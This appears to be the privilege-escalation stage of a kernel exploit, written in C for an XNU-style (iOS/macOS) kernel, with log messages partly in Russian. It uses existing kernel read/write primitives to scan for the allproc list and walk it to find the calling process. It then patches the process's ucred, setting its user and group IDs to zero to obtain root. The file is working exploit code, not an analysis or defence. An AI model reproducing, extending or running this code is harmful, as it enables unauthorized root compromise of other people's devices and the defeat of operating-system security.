#include "exploit.h"
#include <unistd.h>
#include <sys/sysctl.h>

#define PROC_LE_NEXT    0x00
#define PROC_PID        0x60
#define PROC_UCRED      0x88
#define UCRED_UID       0x00
#define UCRED_RUID      0x04
#define UCRED_SVUID     0x08
#define UCRED_NGROUPS   0x0C
#define UCRED_GROUPS    0x10
#define UCRED_RGID      0x50
#define UCRED_SVGID     0x54
#define UCRED_GMUID     0x58
#define PROC_WALK_MAX   512

static int kwrite32(uint64_t target, uint32_t val) {
    uint64_t old = 0;
    if (nk_kread(target, &old, 8) != 0) return -1;
    uint64_t new_val = (old & 0xFFFFFFFF00000000ULL) | (uint64_t)val;
    return nk_kwrite64(target, new_val);
}

static int looks_like_proc(uint64_t cand, pid_t want) {
    int32_t pid = 0;
    if (nk_kread(cand + PROC_PID, &pid, sizeof(pid)) != 0) return 0;
    if (pid != (int32_t)want) return 0;
    uint64_t cred = 0;
    if (nk_kread(cand + PROC_UCRED, &cred, sizeof(cred)) != 0) return 0;
    if (!nk_in_kimg(cred)) return 0;
    return 1;
}

uint64_t nk_allproc_resolve(void) {
    if (!g_nk.slide || !g_nk.has_rw) {
        nk_log("[-] allproc: нет slide/rw");
        return 0;
    }
    if (!g_nk.verified) {
        nk_log("[-] allproc: slide не подтверждён magic — отказ сканировать");
        return 0;
    }
    pid_t me = getpid();
    uint64_t dc = g_nk.base_data_const;
    if (!dc) dc = PRE_SLIDE_DATA_CONST + g_nk.slide;

    nk_log("[allproc] scan __DATA_CONST 0x%llx .. +0x400000 for pid=%d",
           (unsigned long long)dc, (int)me);

    for (uint64_t off = 0; off < 0x400000; off += 8) {
        uint64_t head = 0;
        if (nk_kread(dc + off, &head, sizeof(head)) != 0) continue;
        if (!nk_in_kimg(head)) continue;
        if (!looks_like_proc(head, me)) continue;

        uint64_t p = head;
        int seen = 0;
        for (int i = 0; i < PROC_WALK_MAX && p; i++) {
            int32_t pid = 0;
            if (nk_kread(p + PROC_PID, &pid, sizeof(pid)) != 0) break;
            if (pid == (int32_t)me) seen++;
            uint64_t nx = 0;
            if (nk_kread(p + PROC_LE_NEXT, &nx, sizeof(nx)) != 0) break;
            p = nx;
        }
        if (seen >= 1) {
            nk_log("[+] allproc head @0x%llx (off=0x%llx from DATA_CONST)",
                   (unsigned long long)(dc + off), (unsigned long long)off);
            return dc + off;
        }
    }
    nk_log("[-] allproc не найден в окне 0x400000");
    return 0;
}

uint64_t nk_find_proc(pid_t target_pid) {
    if (!g_nk.base) {
        nk_log("[-] privesc: g_nk.base not set");
        return 0;
    }
    uint64_t allproc = nk_allproc_resolve();
    if (!allproc) {
        nk_log("[-] privesc: allproc unresolved — используй data-only blind root");
        return 0;
    }
    uint64_t proc = 0;
    if (nk_kread(allproc, &proc, sizeof(proc)) != 0 || !proc) {
        nk_log("[-] privesc: allproc read failed or empty");
        return 0;
    }
    for (int i = 0; i < PROC_WALK_MAX && proc; i++) {
        int32_t pid = (int32_t)nk_kread32(proc + PROC_PID);
        if (pid == (int32_t)target_pid) {
            nk_log("[+] privesc: found proc for pid %d @ 0x%llx",
                   (int)target_pid, (unsigned long long)proc);
            return proc;
        }
        proc = nk_kread64(proc + PROC_LE_NEXT);
    }
    nk_log("[-] privesc: pid %d not found in allproc", (int)target_pid);
    return 0;
}

int nk_escalate_root(void) {
    if (!g_nk.has_rw || !g_nk.has_kwrite) {
        nk_log("[-] privesc: kread/kwrite primitive not confirmed");
        return -1;
    }
    if (!g_nk.verified && nk_kaslr_verify() != 0) {
        nk_log("[-] privesc: slide не подтверждён, отказ патчить ucred");
        return -1;
    }
    pid_t me = getpid();
    nk_log("[privesc] escalating pid=%d (base=0x%llx slide=0x%llx src=%s)",
           (int)me, (unsigned long long)g_nk.base,
           (unsigned long long)g_nk.slide, nk_kaslr_source_name());

    uint64_t proc = nk_find_proc(me);
    if (!proc) return -1;
    uint64_t ucred = nk_kread64(proc + PROC_UCRED);
    if (!ucred) {
        nk_log("[-] privesc: p_ucred read failed");
        return -1;
    }
    nk_log("[privesc] ucred @ 0x%llx", (unsigned long long)ucred);
    uint32_t uid_before = nk_kread32(ucred + UCRED_UID);
    nk_log("[privesc] current uid=%u", uid_before);

    int r = 0;
    r |= kwrite32(ucred + UCRED_UID,     0);
    r |= kwrite32(ucred + UCRED_RUID,    0);
    r |= kwrite32(ucred + UCRED_SVUID,   0);
    r |= kwrite32(ucred + UCRED_GROUPS,  0);
    r |= kwrite32(ucred + UCRED_NGROUPS, 1);
    r |= kwrite32(ucred + UCRED_RGID,    0);
    r |= kwrite32(ucred + UCRED_SVGID,   0);
    r |= kwrite32(ucred + UCRED_GMUID,   0);
    if (r != 0) {
        nk_log("[-] privesc: kwrite failed");
        return -1;
    }
    uint32_t uid_after = nk_kread32(ucred + UCRED_UID);
    if (uid_after != 0) {
        nk_log("[-] privesc: uid verify failed (got %u)", uid_after);
        return -1;
    }
    nk_log("[+] privesc: root achieved (uid=%u -> %u)", uid_before, uid_after);
    g_nk.has_root = 1;
    return 0;
}
